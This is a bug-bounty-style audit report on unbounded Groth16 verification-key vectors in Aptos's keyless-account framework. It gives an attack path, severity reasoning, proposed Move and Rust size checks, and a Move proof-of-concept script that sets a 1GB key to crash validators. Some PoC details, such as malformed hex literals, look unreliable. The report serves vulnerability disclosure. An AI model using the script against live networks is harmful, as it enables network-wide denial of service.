# Audit Report

## Title
Groth16 Verification Key OOM Attack via Unbounded Vector Deserialization

## Summary
The `Groth16VerificationKey` struct lacks size validation on its vector fields, allowing an attacker with governance access to set a verification key containing multi-gigabyte vectors. When validators load this configuration from storage during environment initialization, the unbounded BCS deserialization causes Out-of-Memory (OOM) crashes affecting all validators simultaneously, leading to network-wide liveness failure.

## Finding Description

The `Groth16VerificationKey` struct contains five vector fields that can be set through governance proposals without any size constraints: [1](#0-0) 

The vulnerability manifests through the following attack path:

**Step 1: Malicious Governance Proposal**
An attacker submits a governance proposal calling `set_groth16_verification_key_for_next_epoch` with a VK containing multi-gigabyte vectors. The function accepts the VK without any size validation: [2](#0-1) 

**Step 2: Missing Validation**
Although a `validate_groth16_vk` function exists that could check the vectors, it only validates point deserialization and is NEVER called by the setter functions: [3](#0-2) 

Neither `set_groth16_verification_key_for_next_epoch` nor `update_groth16_verification_key` invoke this validation function before storing the VK.

**Step 3: Configuration Activation**
At the next epoch, the malicious VK is activated and stored on-chain: [4](#0-3) 

**Step 4: Validator OOM During Environment Loading**
When validators create a new `AptosEnvironment` (at block/epoch boundaries), the VK is loaded from storage: [5](#0-4) 

This calls `fetch_keyless_config` which deserializes the entire VK structure using BCS: [6](#0-5) 

The BCS deserialization at line 104 allocates memory for all vector contents without any size limits, causing OOM when vectors are multi-gigabyte in size.

**Step 5: Minimal Rust-side Validation**
The Rust conversion code only validates that `gamma_abc_g1` contains exactly 2 elements, but does NOT check the size of individual byte vectors: [7](#0-6) 

This vulnerability breaks the **Resource Limits** invariant: "All operations must respect gas, storage, and computational limits." The unbounded memory allocation during VK loading violates memory resource constraints.

## Impact Explanation

This is a **High Severity** vulnerability per Aptos bug bounty criteria for the following reasons:

1. **Validator Node Crashes**: All validators attempting to load the malicious VK will OOM and crash simultaneously
2. **Network Liveness Loss**: With all validators down, the network cannot process new blocks or transactions
3. **Network-Wide Impact**: Unlike single-node attacks, this affects the entire validator set deterministically
4. **Recovery Complexity**: Requires emergency governance intervention or manual node configuration to bypass the malicious VK

The attack directly maps to High Severity impacts: "Validator node slowdowns" (understatement - actual crashes) and can escalate to network availability issues.

## Likelihood Explanation

**Likelihood: Medium-High**

**Attack Prerequisites:**
- Governance proposal approval (requires stake-weighted voting)
- Wait for next epoch/reconfiguration

**Factors Increasing Likelihood:**
- No technical barriers once governance access obtained
- Governance proposals are a legitimate mechanism
- Social engineering could convince governance participants
- The warning comments in the code acknowledge DoS risks but only mention ZKP replay, not OOM attacks

**Factors Decreasing Likelihood:**
- Requires successful governance proposal passage
- Community review of governance proposals may catch suspicious VK sizes
- Attack is deterministic and affects attacker's own interests (network downtime)

## Recommendation

Implement comprehensive size validation at multiple layers:

**1. Add Size Limits in Move (Primary Defense):**

```move
// In keyless_account.move, add constants:
const E_VK_VECTOR_TOO_LARGE: u64 = 4;
const MAX_G1_POINT_BYTES: u64 = 48;  // Reasonable upper bound for compressed G1
const MAX_G2_POINT_BYTES: u64 = 96;  // Reasonable upper bound for compressed G2
const MAX_GAMMA_ABC_LENGTH: u64 = 2; // Already enforced in Rust

// Enhance validate_groth16_vk:
fun validate_groth16_vk(vk: &Groth16VerificationKey) {
    // Size validations
    assert!(vector::length(&vk.alpha_g1) <= MAX_G1_POINT_BYTES, E_VK_VECTOR_TOO_LARGE);
    assert!(vector::length(&vk.beta_g2) <= MAX_G2_POINT_BYTES, E_VK_VECTOR_TOO_LARGE);
    assert!(vector::length(&vk.gamma_g2) <= MAX_G2_POINT_BYTES, E_VK_VECTOR_TOO_LARGE);
    assert!(vector::length(&vk.delta_g2) <= MAX_G2_POINT_BYTES, E_VK_VECTOR_TOO_LARGE);
    assert!(vector::length(&vk.gamma_abc_g1) == MAX_GAMMA_ABC_LENGTH, E_VK_VECTOR_TOO_LARGE);
    
    for (i in 0..vector::length(&vk.gamma_abc_g1)) {
        assert!(vector::length(vector::borrow(&vk.gamma_abc_g1, i)) <= MAX_G1_POINT_BYTES, E_VK_VECTOR_TOO_LARGE);
    };
    
    // Existing point validation
    assert!(option::is_some(&crypto_algebra::deserialize<bn254_algebra::G1, bn254_algebra::FormatG1Compr>(&vk.alpha_g1)), E_INVALID_BN254_G1_SERIALIZATION);
    // ... rest of validation
}

// CALL validation in setter functions:
public fun set_groth16_verification_key_for_next_epoch(fx: &signer, vk: Groth16VerificationKey) {
    system_addresses::assert_aptos_framework(fx);
    validate_groth16_vk(&vk);  // ADD THIS LINE
    config_buffer::upsert<Groth16VerificationKey>(vk);
}
```

**2. Add Defensive Size Check in Rust (Defense in Depth):**

```rust
// In types/src/keyless/groth16_vk.rs
const MAX_G1_POINT_BYTES: usize = 48;
const MAX_G2_POINT_BYTES: usize = 96;

impl TryFrom<&Groth16VerificationKey> for PreparedVerifyingKey<Bn254> {
    type Error = CryptoMaterialError;

    fn try_from(vk: &Groth16VerificationKey) -> Result<Self, Self::Error> {
        // Size validations
        if vk.alpha_g1.len() > MAX_G1_POINT_BYTES {
            return Err(CryptoMaterialError::ValidationError);
        }
        if vk.beta_g2.len() > MAX_G2_POINT_BYTES ||
           vk.gamma_g2.len() > MAX_G2_POINT_BYTES ||
           vk.delta_g2.len() > MAX_G2_POINT_BYTES {
            return Err(CryptoMaterialError::ValidationError);
        }
        if vk.gamma_abc_g1.len() != 2 {
            return Err(CryptoMaterialError::DeserializationError);
        }
        for point in &vk.gamma_abc_g1 {
            if point.len() > MAX_G1_POINT_BYTES {
                return Err(CryptoMaterialError::ValidationError);
            }
        }
        
        // Existing deserialization logic...
    }
}
```

## Proof of Concept

```move
// Save as malicious_vk_proposal.move
script {
    use aptos_framework::keyless_account;
    use aptos_framework::aptos_governance;
    use std::vector;
    
    fun main(core_resources: &signer) {
        let framework_signer = aptos_governance::get_signer_testnet_only(core_resources, @0x1);
        
        // Create malicious VK with 1GB vector for alpha_g1
        let malicious_alpha = vector::empty<u8>();
        let i = 0;
        while (i < 1073741824) {  // 1GB
            vector::push_back(&mut malicious_alpha, 0u8);
            i = i + 1;
        };
        
        // Use minimal sizes for other fields (still valid points)
        let beta_g2 = x"0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000";
        let gamma_g2 = x"0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000";
        let delta_g2 = x"0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000";
        let point1 = x"00000000000000000000000000000000000000000000000000000000000000000";
        let point2 = x"00000000000000000000000000000000000000000000000000000000000000000";
        
        let vk = keyless_account::new_groth16_verification_key(
            malicious_alpha,
            beta_g2,
            gamma_g2,
            delta_g2,
            vector[point1, point2]
        );
        
        keyless_account::set_groth16_verification_key_for_next_epoch(&framework_signer, vk);
        aptos_governance::force_end_epoch(&framework_signer);
        
        // After epoch change, all validators will OOM when loading this VK
    }
}
```

**Expected Result**: After this proposal executes and the epoch changes, all validators will crash with OOM errors when creating new `AptosEnvironment` instances, causing complete network liveness failure.

## Notes

The vulnerability is particularly severe because:

1. **Simultaneous Impact**: All validators load the same on-chain configuration, so they all crash at the same time
2. **Deterministic Trigger**: The crash occurs during routine environment initialization, not just during keyless transaction validation
3. **No Natural Recovery**: Even after validators restart, they will immediately crash again when trying to load the environment
4. **Precedent in Code**: The warning comments acknowledge DoS risks but focus on ZKP replay attacks rather than memory exhaustion

The fix must be implemented at the Move layer (where the VK is set) rather than only at the Rust layer, since by the time Rust code validates the VK, it has already been stored on-chain and validators are forced to attempt loading it.

### Citations

**File:** types/src/keyless/groth16_vk.rs (L25-31)
```rust
pub struct Groth16VerificationKey {
    pub alpha_g1: Vec<u8>,
    pub beta_g2: Vec<u8>,
    pub gamma_g2: Vec<u8>,
    pub delta_g2: Vec<u8>,
    pub gamma_abc_g1: Vec<Vec<u8>>,
}
```

**File:** types/src/keyless/groth16_vk.rs (L66-68)
```rust
        if vk.gamma_abc_g1.len() != 2 {
            return Err(CryptoMaterialError::DeserializationError);
        }
```

**File:** aptos-move/framework/aptos-framework/sources/keyless_account.move (L183-192)
```text
    fun validate_groth16_vk(vk: &Groth16VerificationKey) {
        // Could be leveraged to speed up the VM deserialization of the VK by 2x, since it can assume the points are valid.
        assert!(option::is_some(&crypto_algebra::deserialize<bn254_algebra::G1, bn254_algebra::FormatG1Compr>(&vk.alpha_g1)), E_INVALID_BN254_G1_SERIALIZATION);
        assert!(option::is_some(&crypto_algebra::deserialize<bn254_algebra::G2, bn254_algebra::FormatG2Compr>(&vk.beta_g2)), E_INVALID_BN254_G2_SERIALIZATION);
        assert!(option::is_some(&crypto_algebra::deserialize<bn254_algebra::G2, bn254_algebra::FormatG2Compr>(&vk.gamma_g2)), E_INVALID_BN254_G2_SERIALIZATION);
        assert!(option::is_some(&crypto_algebra::deserialize<bn254_algebra::G2, bn254_algebra::FormatG2Compr>(&vk.delta_g2)), E_INVALID_BN254_G2_SERIALIZATION);
        for (i in 0..vector::length(&vk.gamma_abc_g1)) {
            assert!(option::is_some(&crypto_algebra::deserialize<bn254_algebra::G1, bn254_algebra::FormatG1Compr>(vector::borrow(&vk.gamma_abc_g1, i))), E_INVALID_BN254_G1_SERIALIZATION);
        };
    }
```

**File:** aptos-move/framework/aptos-framework/sources/keyless_account.move (L263-266)
```text
    public fun set_groth16_verification_key_for_next_epoch(fx: &signer, vk: Groth16VerificationKey) {
        system_addresses::assert_aptos_framework(fx);
        config_buffer::upsert<Groth16VerificationKey>(vk);
    }
```

**File:** aptos-move/framework/aptos-framework/sources/keyless_account.move (L358-368)
```text
    public(friend) fun on_new_epoch(fx: &signer) acquires Groth16VerificationKey, Configuration {
        system_addresses::assert_aptos_framework(fx);

        if (config_buffer::does_exist<Groth16VerificationKey>()) {
            let vk = config_buffer::extract_v2();
            if (exists<Groth16VerificationKey>(@aptos_framework)) {
                *borrow_global_mut<Groth16VerificationKey>(@aptos_framework) = vk;
            } else {
                move_to(fx, vk);
            }
        };
```

**File:** aptos-move/aptos-vm-environment/src/environment.rs (L289-293)
```rust
        let keyless_pvk =
            Groth16VerificationKey::fetch_keyless_config(state_view).and_then(|(vk, vk_bytes)| {
                sha3_256.update(&vk_bytes);
                vk.try_into().ok()
            });
```

**File:** types/src/keyless/mod.rs (L94-106)
```rust
pub trait KeylessOnchainConfig: MoveStructType + DeserializeOwned {
    fn fetch_keyless_config<T>(storage: &T) -> Option<(Self, Bytes)>
    where
        T: KeylessConfigStorage + ?Sized,
    {
        let state_key =
            StateKey::resource_group(&CORE_CODE_ADDRESS, &KeylessGroupResource::struct_tag());
        let bytes = storage.fetch_keyless_config_bytes(&state_key)?;
        let group = bcs::from_bytes::<KeylessGroupResource>(&bytes).ok()?;
        let bytes = group.group.get(&Self::struct_tag())?;
        let config = bcs::from_bytes::<Self>(bytes).ok()?;
        Some((config, bytes.clone()))
    }
```
